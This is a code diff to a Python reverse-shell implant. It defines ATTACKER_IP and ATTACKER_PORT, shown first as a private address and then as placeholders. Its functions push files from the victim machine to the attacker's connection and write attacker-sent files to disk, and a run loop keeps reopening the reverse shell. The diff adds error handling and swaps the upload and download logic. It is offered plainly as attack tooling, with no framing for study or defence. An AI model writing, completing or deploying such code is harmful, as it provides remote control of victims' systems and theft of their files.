@@ -1,10 +1,9 @@
 import socket
 import subprocess
 import os
-import sys
 
-ATTACKER_IP = "10.0.100.16"
-ATTACKER_PORT = 8000
+ATTACKER_IP = "ATTACKER_IP"
+ATTACKER_PORT = ATTACKER_PORT
 
 def reliable_send(data, conn):
     conn.send(data.encode('utf-8'))
@@ -14,24 +13,32 @@ def reliable_recv(conn):
     return data
 
 def upload_file(conn, filename):
-    with open(filename, 'wb') as f:
-        conn.send(b"READY")
-        while True:
-            bits = conn.recv(1024)
-            if bits.endswith(b"DONE"):
-                f.write(bits[:-4])
-                break
-            f.write(bits)
+    try:
+        with open(filename, 'rb') as f:
+            conn.send(b"UPLOAD_READY")
+            while True:
+                bits = f.read(1024)
+                if not bits:
+                    break
+                conn.send(bits)
+            conn.send(b"DONE")
+    except FileNotFoundError:
+        reliable_send("File not found.", conn)
+    except Exception as e:
+        reliable_send(f"Error: {str(e)}", conn)
 
 def download_file(conn, filename):
-    with open(filename, 'rb') as f:
-        conn.send(b"READY")
-        while True:
-            bits = f.read(1024)
-            if not bits:
-                break
-            conn.send(bits)
-        conn.send(b"DONE")
+    try:
+        with open(filename, 'wb') as f:
+            conn.send(b"DOWNLOAD_READY")
+            while True:
+                bits = conn.recv(1024)
+                if bits.endswith(b"DONE"):
+                    f.write(bits[:-4])
+                    break
+                f.write(bits)
+    except Exception as e:
+        reliable_send(f"Error: {str(e)}", conn)
 
 def reverse_shell():
     try:
@@ -78,7 +85,8 @@ def run():
     while True:
         try:
             reverse_shell()
-        except:
+        except Exception as e:
+            print(f"Error: {e}")
             continue
 
 if __name__ == "__main__":
